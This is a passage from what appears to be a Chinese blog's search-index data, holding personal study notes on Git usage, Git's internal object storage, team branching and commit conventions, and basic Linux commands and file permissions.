-r ***：递归删除该目录下的所有文件和子目录\n\ngit mv\n\ngit mv &lt;file&gt;  &lt;newfile&gt; -f：若新文件名已经存在，但还是要重命名它，可用 -f\n\ngit checkout\n\ngit checkout -b 分支名：创建并切换分支\n .gitignore忽略文件\n有些时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件，设计文件等\n在主目录下建立&quot;.gitignore&quot;文件，此文件有如下规则：\n\n忽略文件中的空行或以井号（#）开始的行将会被忽略。\n可以使用Linux通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1,string2,…}）代表可选的字符串等。\n如果名称的最前面有一个感叹号（!），表示例外规则，将不被忽略。\n如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在此目录下，而子目录中的文件不忽略。\n如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。\n\n*.txt        #忽略所有 .txt结尾的文件,这样的话上传就不会被选中！!lib.txt     #但lib.txt除外/temp        #仅忽略项目根目录下的TODO文件,不包括其它目录tempbuild/       #忽略build/目录下的所有文件doc/*.txt    #会忽略 doc/notes.txt 但不包括 doc/server/arch.txt\n Branch\n假设当前主分支经历了两个版本，我们要为当前仓库新增文件，但该文件还不能确定是否需要，我们可在主分支的基础上创建一个新的分支，等新分支文件一切准备好了再合并过来\n\ngit branch &lt;分支名&gt;#创建分支git checkout &lt;分支名&gt;#切换分支git branch -d &lt;分支名&gt;#删除分支，-D可强制删除git checkout -b &lt;分支名1&gt;#创建并马上切换到新分支#等价于↓git switch -c &lt;分支名&gt;git merge &lt;分支名1&gt;#把别的分支合并到当前所处分支\n GitHub Issues\n问题+“#+数字”\ncommit时的-m “解决#+数字”，提交到远程仓库后会关联相应的issue\n GitHub Pull Requests\n若尝试新增一个Pull Request会发现创建按钮无法点击且提示需要选择不同的Branches或Forks\nIssues和Pull Requests会共用&quot;#+数字&quot;的顺序\n后面提交PR后&quot;#+数字&quot;会顺延前面的数字\nPR后远程仓库只有一个分支，但本地仍有两个分支\n若直接branch -d删除，提示出错，且提示可用-D删除\n\n远程仓库已合并，且有n个Commits，而本地只有m个（m＜n），因为本地还没做合并的操作\n\ngit pull origin main\n此时git log会看到此时Commits的数量一致了，再次删除小分支，则不会出错\n 如果想参与别人的项目\n\n\n在github.com上fork到自己仓库\n\n\nclone到本地\n\n\n建立一个branch\ngit branch workgit checkout work---git checkout -b work\n\n\n编程工作\n\n\ngit diff查看更改\n\n\npush到自己的网站\ngit add path/file_name.pygit commit -m &quot;填写你的说明&quot;git push origin work\n\n\n在github上发送PR\n\n\n Fork\n拷贝仓库到自己账号，注意commit时按照别人仓库的规范来进行\n此时进行Fork的那名用户账号里可看到横幅（源仓库拥有者那里不会显示）\n Tags\n#-a是annotation，意为注解git tag -a v1.0.0 -m &quot;v1.0.0大功告成&quot;#删除标签git tag -d v1.0.0\n GitHub Actions\n【Github Action题目world.execute.me 出题人讲解】 https://www.bilibili.com/video/BV1jm411d7Jk/?share_source=copy_web&amp;vd_source=15214a7977f78540f7402494fb912cda\n 拓展链接\nGit _ 报错信息\nhttps://www.cnblogs.com/iini/p/16300299.html\n 实用代码\nclone指定tag的指定commit\ngit clone git@github.com:hankcs/HanLP.git -b v1.7.5 --depth=1# -b 后面接 tag 名，--depth=1 指只克隆最新的版本，可以节省很多空间\nGit的奇技淫巧\n 一台电脑绑很多ssh\nhttps://www.cnblogs.com/jikexianfeng/p/5873698.html\n 撤回已 Push 的代码\nIDEA中Git较为优雅的方法：Reset Current Branch 到你想要恢复的commit记录\n这个时候会跳出四个选项供选择\nSoft：#之前写的不会改变，之前暂存过的文件还在暂存。Mixed：#之前写的不会改变，之前暂存过的文件不会暂存。Hard：#文件恢复到所选提交状态，任何更改都会丢失。你已经提交了，然后你又在本地更改了，如果选hard，那么提交的内容和提交后又本地修改未提交的内容都会丢失。keep：#任何本地更改都将丢失，文件将恢复到所选提交的状态，但本地更改将保持不变。你已经提交了，然后你又在本地更改了，如果选keep，那么提交的内容会丢失，提交后又本地修改未提交的内容不会丢失。\n然后，之前错误提交的commit就在本地给干掉了。但是远程仓库中的提交还是原来的样子，你要把目前状态同步到远程仓库。也就是需要把那几个commit删除的操作push过去。\n打开push界面，虽然没有commit需要提交，需要点击Force Push，强推过去。\n\n需要注意的是对于一些被保护的分支，这个操作是不能进行的。需要自行查看配置，我这里因为不是master分支，所以没有保护。\n\n实操\ngit reset --hard &lt;所需要恢复到位置的hash值&gt;git push --force origin\n .git\n简单地说，git 只是一堆通过文件名相互链接的文本文件。\n git init\n$ tree .git.git├── config├── HEAD├── hooks│   └── prepare-commit-msg.msample├── objects│   ├── info│   └── pack└── refs    ├── heads    └── tags\n\n\nconfig是一个 txt 文件，里面记录了当前仓库的 git 设置，如作者信息、文件模式等。\n\n\nHEAD表示仓库的当前head。根据你设置的默认分支，它可能是refs/heads/master或refs/heads/main或其他你设定的名字。实际上，它指向refs/heads这个文件夹，并关联了一个名为master的文件，但该文件目前还不存在。只有在你完成首次提交后，master文件才会生成。\n\n\nhooks是一个特殊的目录，其中包含了可以在git执行任何操作前后运行的脚本。\n\nhttps://blog.meain.io/2019/making-sure-you-wont-commit-conflict-markers/\n\n\n\nobjects存放的是git的对象，比如关于仓库中的文件、提交等的数据。我们稍后会对此进行深入探讨。\n\n\nrefs正如我们之前提到的，是用来存放引用的目录。例如，refs/heads里存放的是分支的引用，而refs/tags则存放的是标签的引用。我们将进一步深入了解这些文件的内容。\n\n\n git add file\n--- init       2023-07-02 15:14:00.584674816 +0530+++ add        2023-07-02 15:13:53.869525054 +0530@@ -3,7 +3,10 @@ ├── HEAD ├── hooks │   └── prepare-commit-msg.msample+├── index ├── objects+│   ├── 4c+│   │   └── 5b58f323d7b459664b5d3fb9587048bb0296de │   ├── info │   └── pack └── refs\n此操作主要引发了两个变化。首先，文件index被修改。index是记录当前暂存信息的地方，这表明名为file的文件已经被加入到索引中。\n更为关键的是，新建了一个objects/4c文件夹，并在其中添加了5b58f323d7b459664b5d3fb9587048bb0296de文件。\n#看看该文件具体包含了什么信息$ file .git/objects/4c/5b58f323d7b459664b5d3fb9587048bb0296de.git/objects/4c/5b58f323d7b459664b5d3fb9587048bb0296de: zlib compressed data---#这个用 zlib 压缩的数据中具体包含了什么呢？$ zlib-flate -uncompress &lt;.git/objects/4c/5b58f323d7b459664b5d3fb9587048bb0296deblob 9\\0meain.io\n结果可看出，该文件记录了我们之前通过git add命令添加的file文件的相关信息，包括文件的类型、大小和内容。具体地说，文件类型为blob，大小为9，内容则是meain.io。\n\n文件名其实是基于内容的sha1哈希值生成的。通过对zlib压缩的数据进行sha1sum处理，我们就可以得到这样的文件名。\n$ zlib-flate -uncompress &lt;.git/objects/4c/5b58f323d7b459664b5d3fb9587048bb0296de|sha1sum4c5b58f323d7b459664b5d3fb9587048bb0296de\ngit在存储内容时，会使用内容的sha1哈希值，取其前两个字符作为文件夹名（如4c），余下的部分作为文件名。这种方式是为了确保在objects文件夹中不会有过多的文件，从而使文件系统保持高效。\n\ngit cat-file\ngit提供了一个基础命令git cat-file，让我们可以更直观地查看它。通过-t参数，你可以查询对象的类型；使用-s参数，你可以得知对象的大小；而-p参数则能让你直观地查看对象的具体内容。\n$ git cat-file -t 4c5b58f323d7b459664b5d3fb9587048bb0296deblob$ git cat-file -s 4c5b58f323d7b459664b5d3fb9587048bb0296de9$ git cat-file -p 4c5b58f323d7b459664b5d3fb9587048bb0296demeain.io\n git commit\n$ git commit -m &#x27;Initial commit&#x27;[master (root-commit) 4c201df] Initial commit 1 file changed, 1 insertion(+) create mode 100644 file\n以下是相关的变动：\n--- init        2023-07-02 15:14:00.584674816 +0530+++ commit      2023-07-02 15:33:28.536144046 +0530@@ -1,11 +1,25 @@ .git+├── COMMIT_EDITMSG ├── config ├── HEAD ├── hooks │   └── prepare-commit-msg.msample ├── index+├── logs+│   ├── HEAD+│   └── refs+│       └── heads+│           └── master ├── objects+│   ├── 3c+│   │   └── 201df6a1c4d4c87177e30e93be1df8bfe2fe19 │   ├── 4c │   │   └── 5b58f323d7b459664b5d3fb9587048bb0296de+│   ├── 62+│   │   └── 901ec0eca9faceb8fe0a9870b9b6cde75a9545 │   ├── info │   └── pack └── refs     ├── heads+    │   └── master     └── tags\n首先有一个新文件``COMMIT_EDITMSG`，保存了最新的提交信息。\n若直接运行git commit未带-m参数，git会启动一个编辑器并加载COMMIT_EDITMSG文件，方便用户编辑提交信息。编辑完成后，git就采用该文件内容作为提交信息。\n此外，新增了一个logs目录，git通过它来记录所有的提交变动。在此，你可以查看所有引用（refs）及HEAD的提交记录。\nobject文件夹也发生了些变化，但首先，我希望你关注一下refs/heads目录，里面现有一个master文件。毫无疑问，这就是master分支的引用。\n$ cat refs/heads/master3c201df6a1c4d4c87177e30e93be1df8bfe2fe19\n显然，它是指向了一个新的对象。我们有方法查看这类对象，接着来试试。\n$ git cat-file -t 3c201df6a1c4d4c87177e30e93be1df8bfe2fe19commit$ git cat-file -p 3c201df6a1c4d4c87177e30e93be1df8bfe2fe19tree 62902ec0eca9faceb8fe0a9870b9b6cde75a9545author Abin Simon &lt;mail@meain.io&gt; 1688292123 +0530committer Abin Simon &lt;mail@meain.io&gt; 1688292123 +0530Initial commit\n\n同样可以使用git cat-file -t refs/heads/master命令来查看。\n\n从commit的内容中，我们得知它包含了一个哈希值为62902ec0eca9faceb8fe0a9870b9b6cde75a9545的tree对象，这与我们在提交时新加的对象相似。commit`还显示了这次提交的作者和提交者信息，这里都是我。最后，它还展示了这次提交的信息。\n接下来，让我们看一下tree对象中包含的内容。\n$ git cat-file -t 62902ec0eca9faceb8fe0a9870b9b6cde75a9545tree$ git cat-file -p 62901ec0eca9faceb8fe0a9870b9b6cde75a9545100644 blob 4c5b58f323d7b459664b5d3fb9587048bb0296de    file\ntree对象中会通过其他tree和blob对象的形式呈现工作目录的状态。在这个示例中，因为我们仅有一个名为file的文件，所以你只能见到一个对象。细看的话，你会发现这个文件指向了我们在执行git add file时加入的那个初始对象。\n下面展示了一个更为成熟的仓库中的tree示意。在commit对象关联的tree对象中，嵌套有更多的tree对象，用以标识不同的文件夹。\n$ git cat-file -p 2e5e84c3ee1f7e4cb3f709ff5ca0ddfc259a8d04100644 blob 3cf56579491f151d82b384c211cf1971c300fbf8    .dockerignore100644 blob 02c348c202dd41f90e66cfeb36ebbd928677cff6    .gitattributes040000 tree ab2ba080c4c3e4f2bc643ae29d5040f85aca2551    .github100644 blob bdda0724b18c16e69b800e5e887ed2a8a210c936    .gitignore100644 blob 3a592bc0200af2fd5e3e9d2790038845f3a5cf9b    CHANGELOG.md100644 blob 71a7a8c5aacbcaccf56740ce16a6c5544783d095    CODE_OF_CONDUCT.md100644 blob f433b1a53f5b830a205fd2df78e2b34974656c7b    LICENSE100644 blob 413072d502db332006536e1af3fad0dce570e727    README.md100644 blob 1dd7ed99019efd6d872d5f6764115a86b5121ae9    SECURITY.md040000 tree 918756f1a4e5d648ae273801359c440c951555f9    build040000 tree 219a6e58af53f2e53b14b710a2dd8cbe9fea15f5    design040000 tree 5810c119dd4d9a1c033c38c12fae781aeffeafc1    docker040000 tree f09c5708676cdca6562f10e1f36c9cfd7ee45e07    src040000 tree e6e1595f412599d0627a9e634007fcb2e32b62e5    website\n git commit -a(modify)\n$ git commit -am &#x27;Use blog link&#x27;[master 68ed5aa] Use blog link 1 file changed, 1 insertion(+), 1 deletion(-)\n更改内容如下：\n--- commit      2023-07-02 15:33:28.536144046 +0530+++ update      2023-07-02 15:47:20.841154907 +0530@@ -17,6 +17,12 @@ │   │   └── 5b58f323d7b459664b5d3fb9587048bb0296de │   ├── 62 │   │   └── 901ec0eca9faceb8fe0a9870b9b6cde75a9545+│   ├── 67+│   │   └── ed5aa2372445cf2249d85573ade1c0cbb312b1+│   ├── 8a+│   │   └── b377e2f9acd9eaca12e750a7d3cb345065049e+│   ├── e5+│   │   └── ec63cd761e6ab9d11e7dc2c4c2752d682b36e2 │   ├── info │   └── pack └── refs\n新增了三个对象。一个是含有文件新内容的blob对象，还有一个是tree对象，以及一个commit对象。\n再次从HEAD或refs/heads/master开始追踪这些对象。\n$ git cat-file -p refs/heads/mastertree 9ab377e2f9acd9eaca12e750a7d3cb345065049eparent 3c201df6a1c4d4c87177e30e93be1df8bfe2fe19author Abin Simon &lt;mail@meain.io&gt; 1688292975 +0530committer Abin Simon &lt;mail@meain.io&gt; 1688292975 +0530Use blog link$ git cat-file -p 9ab377e2f9acd9eaca12e750a7d3cb345065049e100644 blob e5ec63cd761e6ab9d11e7dc2c4c2752d682b36e2    file$ git cat-file -p e6ec63cd761e6ab9d11e7dc2c4c2752d682b36e2blog.meain.io\n仔细观察会注意到commit对象现在有了一个额外的键名为parent，它链接到上一个提交，因为当前提交是基于上一个提交创建的。\n git branch\ngit branch fix-url\n--- update      2023-07-02 15:47:20.841154907 +0530+++ branch      2023-07-02 15:55:25.165204941 +0530@@ -27,5 +28,6 @@ │   └── pack └── refs     ├── heads+    │   ├── fix-url     │   └── master     └── tags\n此操作会在refs/heads目录下加入一个新的文件。该文件的名称就是我们新建的分支名，而内容则是最新的提交标识id。\n$ cat .git/refs/heads/fix-url68ed5aa2372445cf2249d85573ade1c0cbb312b1\n这基本上就是创建分支的全部内容。在git中，分支是相当轻便的。另外，标签的创建也是类似的操作，但它们是被创建在refs/tags目录下。\n在logs目录下也新增了一个文件，该文件用于记录与master分支类似的提交历史信息。\n git checkout\n在git中进行分支切换实际上是让git获取某个提交的tree对象，并更新工作区中的文件，使其与其中记录的状态相匹配。在此例中，由于我们是从master分支切换到fix-url分支，而这两个分支都指向同一个commit和它的tree对象，因此git在工作区的文件上并没有任何更改。\ngit checkout fix-url\n在进行分支切换时，.git目录中唯一发生的变化是.git/HEAD文件的内容，现在它指向fix-url分支。\n$ cat .git/HEADref: refs/heads/fix-url\n既然我们在这里，我将进行一个提交操作。这将有助于我稍后展示合并的效果。\n$ echo &#x27;https://blog.meain.io&#x27;&gt;file$ git commit -am &#x27;Fix url&#x27;\n git merge\n有三种主要的合并方法。\n\n\n最简单且直观的是快进式合并。这种方式中，你只是更新一个分支的提交，使其指向另一个分支的提交。具体操作就是把refs/heads/fix-url中的哈希值复制到refs/heads/master。\n\n\n第二种是变基（rebase）合并。在这种方式中，我们首先将更改依次应用到主分支当前的提交上，然后进行类似于快进式的合并。\n\n\n第三种是通过创建一个独立的合并来合并两个分支。这种方法与前两者略有不同，因为它的提交对象会有两个parent条目。我们稍后会详细探讨这种方法。\n\n\n首先，我们来看看合并前的graph。\ngit log --graph --oneline --all* 42c6318 (fix-url) Fix url* 67ed5aa (HEAD -&gt; master) Use blog link* 3c201df Initial commit\n接下来进行合并：\n$ git merge fix-url # updates refs/heads/master to the hash in refs/heads/fix-url\n我们再来看看合并后的 graph。\n$ git log --graph --oneline --all* 42c6318 (HEAD -&gt; master) (fix-url) Fix url* 67ed5aa Use blog link* 3c201df Initial commit\n git remote\n为了演示这个过程，我首先创建了一个新的git仓库作为这个仓库的远程连接。\n$ mkdir git-talk-2$ cd git-talk-2 &amp;&amp; git init --bare$ cd ../git-talk &amp;&amp; git remote add origin ../git-talk-2\n\ngit init --bare用于在git中创建一个裸（bare）仓库，裸仓库则不包含工作目录，它只是一个.git目录，没有实际的项目文件。裸仓库通常被用作远程仓库，用于与其他开发者共享代码。它只包含Git版本控制所需的文件，因此更适合作为一个中心化的代码仓库。\n当你在一个服务器上搭建Git仓库时，通常会使用裸仓库。这样其他开发者可以通过克隆（clone）这个裸仓库来获取项目代码，并将自己的更改推送（push）回去，而不会涉及到冗余的工作目录。\n\n另外，添加新的远程仓库实际上是修改了配置文件，可以在.git/config中查看这个变更。接下来，执行推送操作。\n$ git push origin master\n再来检查一下本地仓库发生了哪些改变。\n--- branch\t2023-07-02 15:55:25.165204941 +0530+++ remote\t2023-07-02 17:41:05.170923141 +0530@@ -22,12 +29,18 @@ │   ├── e5 │   │   └── ec63cd761e6ab9d11e7dc2c4c2752d682b36e2 │   ├── info │   └── pack ├── ORIG_HEAD └── refs     ├── heads     │   ├── fix-url     │   └── master+    ├── remotes+    │   └── origin+    │       └── master     └── tags\n会发现新增了一个新的refs/remotes目录，这是用来存储不同远程仓库相关信息的。\n但是，实际上传送到远程git仓库的数据是什么呢？那就是objects文件夹内的所有数据，以及你明确推送的refs下的分支和标签。仅凭这些，远程的git就能完整地构建出你的所有git历史记录。\n 大厂的Git代码管理规范\n 分支命名\n\nmaster分支\n\nmaster为主分支，也是用于部署生产环境的分支，需要确保master分支稳定性。master分支一般由release以及hotfix分支合并，任何时间都不能直接修改代码。\n\ndevelop分支\n\ndevelop为开发环境分支，始终保持最新完成以及bug修复后的代码，用于前后端联调。一般开发新功能时，feature分支都是基于develop分支创建的。\n\nfeature分支\n\n开发新功能时，以develop为基础创建feature分支。\n分支命名时以feature/开头，后面可以加上开发的功能模块，命名示例：feature/user_module、feature/cart_module。\n\ntest分支\n\ntest为测试环境分支，外部用户无法访问，专门给测试人员使用，版本相对稳定。\n\nrelease分支\n\nrelease为预上线分支（预发布分支），UAT测试阶段使用。一般由test或hotfix分支合并，不建议直接在release分支上直接修改代码。\n\nhotfix分支\n\n线上出现紧急问题时，需要及时修复，以master分支为基线，创建hotfix分支。修复完成后，需要合并到master分支和develop分支。\n分支命名以hotfix/开头的为修复分支，它的命名规则与feature分支类似。\n 分支与环境对应关系\n在系统开发过程中常用的环境：\n\nDEV环境（Development environment）：用于开发者调试使用。\nFAT环境（Feature Acceptance Test environment）：功能验收测试环境，用于测试环境下的软件测试者测试使用。\nUAT环境（User Acceptance Test environment）：用户验收测试环境，用于生产环境下的软件测试者测试使用。\nPRO环境（Production environment）：生产环境。\n\n对应关系：\n\n\n\n分支\n功能\n环境\n可访问\n\n\n\n\nmaster\n主分支，稳定版本\nPRO\n是\n\n\ndevelop\n开发分支，最新版本\nDEV\n是\n\n\nfeature\n开发分支，实现新特性\n\n否\n\n\ntest\n测试分支，功能测试\nFAT\n是\n\n\nrelease\n预上线分支，发布新版本\nUAT\n是\n\n\nhotfix\n紧急修复分支，修复线上bug\n\n否\n\n\n\n 分支合并流程规范\n业界常见的两大主分支（master、develop）、三个辅助分支（feature、release、hotfix）的生命周期：\n\n以上生命周期仅作参考，不同开发团队可能有不同的规范，可自行灵活定义。\n例如我们团队在开发时，至少需要保证以下流程：\n\ndevelop分支和hotfix分支，必须从master分支检出。\n由develop分支合并到test分支。\n功能测试无误后，由test分支合并到release分支。\nUAT测试通过后，由release分支合并到master分支。\n对于工作量小的功能开发（工时小于1天），可以直接在devolop分支进行开发，否则由develop分支检出feature分支进行开发，开发完后合并到develop分支。\n\n Git Commit Message规范\nGit Commit Message规范指提交代码时编写的规范注释，编写良好的Commit Message可以达到3个重要的目的：\n\n加快代码review的流程。\n帮助我们编写良好的版本发布日志。\n让之后的维护者了解代码里出现特定变化和feature被添加的原因。\n\n Angular Git Commit Guidelines\n业界应用的比较广泛的是Angular Git Commit Guidelines：\n&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&lt;BLANK LINE&gt;&lt;body&gt;&lt;BLANK LINE&gt;&lt;footer&gt;\n\ntype：提交类型。\nscope：可选项，本次commit波及的范围。\nsubject：简明扼要地阐述下本次commit的主旨，在AngularGit Commit Guidelines中强调了三点。使用祈使句，首字母不要大写，结尾无需添加标点。\nbody：同样使用祈使句，在主体内容中我们需要把本次commit详细地描述一下，比如此次变更的动机。\nfooter：描述下与之关联的issue或break change。\n\n 简易版\n项目中实际可以采用简易版规范：\n&lt;type&gt;(&lt;scope&gt;):&lt;subject&gt;\n type规范\nAngular Git CommitGuidelines中推荐的type类型如下：\n\nfeat：新增功能。\nfix：修复bug。\ndocs：仅文档更改。\nstyle：不影响代码含义的更改（空白、格式设置、缺失分号等）。\nrefactor：既不修复bug也不添加特性的代码更改。\nperf：改进性能的代码更改。\ntest：添加缺少的测试或更正现有测试。\nchore：对构建过程或辅助工具和库（如文档）的更改。\n\n除此之外，还有一些常用的类型：\n\ndelete：删除功能或文件。\nmodify：修改功能。\nbuild：改变构建流程，新增依赖库、工具等（例如webpack、gulp、npm修改）。\ntest：测试用例的新增、修改。\nci：自动化流程配置修改。\nrevert：回滚到上一个版本。\n\n 单次提交注意事项\n\n提交问题必须为同一类别。\n提交问题不要超过3个。\n提交的commit发现不符合规范，git commit --amend -m &quot;新的提交信息&quot;或git reset --hard HEAD重新提交一次。\n\n 配置.gitignore文件\n.gitignore是一份用于忽略不必提交的文件的列表，项目中可以根据实际需求统一.gitignore文件，减少不必要的文件提交和冲突，净化代码库环境。\n通用文件示例：\nHELP.mdtarget/!.mvn/wrapper/maven-wrapper.jar!**/src/main/**/target/!**/src/test/**/target/### STS ###.apt_generated.classpath.factorypath.project.settings.springBeans.sts4-cache### IntelliJ IDEA ###.idea*.iws*.iml*.ipr### NetBeans ###/nbproject/private//nbbuild//dist//nbdist//.nb-gradle/build/!**/src/main/**/build/!**/src/test/**/build/### VS Code ###.vscode/# Log file*.log/logs*# BlueJ files*.ctxt# Mobile Tools for Java (J2ME).mtj.tmp/# Package Files #*.jar*.war*.ear*.zip*.tar.gz*.rar*.cmd\n 其他\n此外，还有一些其他建议：\n\nmaster分支的每一次更新，都建议打tag添加标签，通常为对应版本号，便于管理。\nfeature分支、hotfix分支在合并后可以删除，避免分支过多，管理混乱。\n每次pull代码前，提交本地代码到本地库中，否则可能会出现合并代码出错，导致代码丢失。\n\n","tags":["技术栈"]},{"title":"Linux","url":"/2023/06/22/Linux/","content":" Linux\n文章：http://dwz.date/UDf\n\n Linux目录划分\n\n\n/bin：binary缩写，此目录存放着最经常使用的命令\n/boot：存放启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件\n/dev：device的缩写，存放Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的\n/etc：存放所有的系统管理所需要的配置文件和子目录\n/home：用户主目录，Linux中每个用户都有一个自己的目录，一般以用户的账号命名\n/lib：存放系统最基本的动态连接共享库，作用类似于Windows里的dll文件\n/lost+found：一般情况为空，当系统非法关机后这里就存放了一些文件\n/media：Linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后Linux会把识别的设备挂载到这个目录下\n/mnt：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可将光驱挂载在/mnt/上，然后进入该目录就可以看到光驱里的内容了\n/opt：给主机额外安装软件所摆放的目录。安装一个Oracle数据库就可以放到这个目录下，默认为空\n/proc：虚拟目录，是系统内存的映射，可通过直接访问这个目录获取系统信息\n/root：为系统管理员，也称作超级权限者的用户主目录\n/sbin：s是super user的意思，这里存放的是系统管理员使用的系统管理程序\n/srv：存放一些服务启动之后需要提取的数据\n/sys：这是Linux2.6内核的一个很大的变化，该目录下安装了2.6内核中新出现的一个文件系统sysfs\n/tmp：存放一些临时文件\n/usr：非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于Windows下的program files目录\n/usr/bin：系统用户使用的应用程序\n/usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序\n/usr/src：内核源代码默认的放置目录\n/var：存放着在不断扩充着的东西，我们习惯讲那些经常被修改的目录放在这个目录下。包括各种日志文件\n/run：一个临时文件系统，存储系统启动以来的信息，当系统重启时，这个目录下的文件应该被删掉或清除\n/www：存放服务器网站相关的资源、环境、网站的项目\n\n 文件属性\n 基本属性\n\n第0位确定文件类型：\n\n[ d ]：目录\n[ - ]：文件\n[ l ]：链接文档（link file）\n[ b ]：装置文件里面的可供储存的接口设备（可随机存取装置）\n[ c ]：装置文件里面的串行端口设备，例如键盘、鼠标（一次性读取装置）\n\n后为相关权限：\n[ r ]：可读（read）、[ w ]：可写（write）、[ x ]：可执行（execute）；若无权限则会出现[ - ]\ndr-xr-xr-x. 5 root root 4096 5月 16 18:15 boot\n\n数字为文件个数\n第一个root为属主\n第二个root为属组\n\n 修改属性\n\nchgrp：更改文件属组\n\nchgrp -R 属主名 文件名\n\nchown：更改文件属主，也可同时更改文件属组\n\nchown -R 属主名 文件名chown -R 属主名:属组名 文件名\n\nchmod：更改文件九个属性\n\nchmod 数字 文件或目录名\n\n数字代表权限\nr：4\tw：2\tx：1\n\n 常用基本命令\n\n\nsudo su：切换到管理员\n\n\ncd：切换目录\n\n~：切换到home目录\n-：切换到上次访问的目录\n\n\n\nls：列出目录\n\n-a：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来\n-l ：长数据串列出，包含文件的属性与权限等等数据；\n\n\n\npwd：显示目前所在的目录\nPrint Working Directory 的缩写，也就是显示目前所在目录的命令\n\n-p：显示出确实的路径，而非连接（link）路径\n\n\n\nmkdir：创建新目录\n\n-m：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色\n-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起来！\n\n\n\nrmdir：删除空的目录\n\n-p：连同上一级空的目录也一起删除\n\n\n\ncp：复制文件或目录\ncp  原来的地方  新的地方\n\n\n-a：相当于-pdr\n\n\n-p：连同文件的属性一起复制过去，而非使用默认属性（备份常用）\n\n\n-d：若来源裆为连结档的属性（link file），则复制连结档属性而非文件本身\n\n\n-r：递归持续复制，用于目录的复制行为\n\n\n-f：强制的意思，若目标文件已存在且无法开启，则移除后再尝试一次\n\n\n-i：若目标档（destination）已存在时，在覆盖时会先询问动作的进行\n\n\n-l：进行硬式连结（hard link）的连结档创建，而非复制文件本身\n\n\n-s：复制成为符号连结档（symbolic link），亦即捷径文件\n\n\n-u：若destination比source旧才升级destination\n\n\n\n\nrm：移除文件或目录\n\n-f：忽略不存在的文件，不会出现警告，强制删除\n-r：递归删除目录\n-i：互动模式，删除前询问是否删除\n\n\n\nmv：移动文件与目录，或修改名称\n\n-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖\n-i ：若目标文件（destination）已经存在时，就会询问是否覆盖\n-u ：若目标文件已经存在，且source比较新，才会升级（update）\n\n\n\n# 开启防火墙端口firewall-cmd --zone=public --add-port=9000/tcp --permanent# 重启防火墙systemctl restart firewalld.service# 查看所有开启的端口（若为阿里云还需配置安全组规则）firewall-cmd --list-ports\n\n\nfirewall-cmd：防火墙相关\n\n–zone：作用域\n–add-port=80/tcp：添加端口，格式为：端口/通讯协议\n–permanent：永久生效，无此参数重启后失效\n\n\n\nnetstat -an：查看当前系统端口\n\n\nnetstat -an|grep ：指定端口（搜索指定端口）\n\n\nsu - 用户名：切换用户\n\n\nman：列出完整的命令语法、各选项意义及相关命令\n\n\n-w：输出手册物理位置\n\n\n编号规则\nman 1 ls\n\n普通命令为1\n函数为2\n库文件为3\n设备为4\n配置文件为5\n游戏为6\n宏文件为7\n系统命令为8\n内核程序为9\nTK指令为10\n\n\n\n\n\ntee：读取标准输入的数据，并将其内容输出成文件\n\n-a：附加到既有文件的后面而非覆盖它\n-i：忽略中断信号\n\n\n\n 文件内容查看\n\n\ncat：正序显示文件内容\n\n\n-A：相当于-vET的整合选项，可列出一些特殊字符而不是空白\n\n\n-b：列出行号，仅针对非空白行做行号显示，空白行不标行号\n\n\n-E：将结尾的断行字节$显示出来\n\n\n-n：列印出行号，连同空白行也会有行号，与-b的选项不同\n\n\n-T：将[tab]按键以^I显示出来\n\n\n-v：列出一些看不出来的特殊字符\n\n\n\n\ntac：倒序显示文件内容\n\n\nnl：显示行号\n\n-b：指定行号指定的方式，主要有两种：\n\n-b a：表示不论是否为空行，也同样列出行号（类似cat -n）\n-b t：如果有空行，空的那一行不要列出行号（默认值）\n\n\n-n：列出行号表示的方法，主要有三种：\n\n-n ln：行号在荧幕的最左方显示\n-n rn：行号在自己栏位的最右方显示，且不加0\n-n rz：行号在自己栏位的最右方显示，且加0\n\n\n-w：行号栏位的占用的位数\n\n\n\nmore：一页一页翻动\n有以下按键：\n\n空格：向下翻一页\nenter：向下翻一行\n/字符串：向下搜寻『字符串』这个关键字\n:f：立刻显示出档名以及目前显示的行数\nq：立刻离开more，不再显示该文件内容\nb或Ctrl b：代表往回翻页，不过这动作只对文件有用，对管线无用\n\n\n\nless\n基本同上，多向上的功能\n\n?字符串：向上搜寻『字符串』这个关键字\nn：重复前一个搜寻（与/或?有关）\nN：反向的重复前一个搜寻（与/或?有关）\n\n\n\nhead：取文件前几行\n\n\nhead -n 数字 文件\n-n后的数字代表显示几行，默认10行\n\ntail：取文件后几行\n\n同上\n 查找命令\n\ngrep\n\nps -ef | grep sshd                  #查找指定ssh服务进程ps -ef | grep sshd | grep -v grep   #查找指定服务进程，排除gerp本身ps -ef | grep sshd -c               #查找指定进程个数\n\nfind\n\nfind命令在目录结构中搜索文件，并对搜索结果执行指定的操作。 find 默认搜索当前目录及其子目录，并且不过滤任何结果（也就是返回所有文件），将它们全都显示在屏幕上。\nfind . -name &quot;*.log&quot; -ls       #在当前目录查找以.log结尾的文件，并显示详细信息。find /root/ -perm 600          #查找/root/目录下权限为600的文件find . -type f -name &quot;*.log&quot;   #查找当目录，以.log结尾的普通文件find . -type d | sort          #查找当前所有目录并排序find . -size +100M             #查找当前目录大于100M的文件\n\nlocate\n\nlocate 让使用者可以很快速的搜寻某个路径。默认每天自动更新一次，所以使用locate 命令查不到最新变动过的文件。为了避免这种情况，我们在使用locate查找文件之前可以先使用updatedb命令，手动更新数据库。\nupdatedblocate /etc/sh    #搜索etc目录下所有以sh开头的文件locate pwd        #查找和pwd相关的所有文件\n\nwhereis\n\nwhereis命令是定位可执行文件、源代码文件、帮助文件在文件系统中的位置。这些文件的属性应属于原始代码，二进制文件，或是帮助文件。\nwhereis ls    #将和ls文件相关的文件都查找出来\n\nwhich\n\nwhich命令的作用是在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。\nwhich 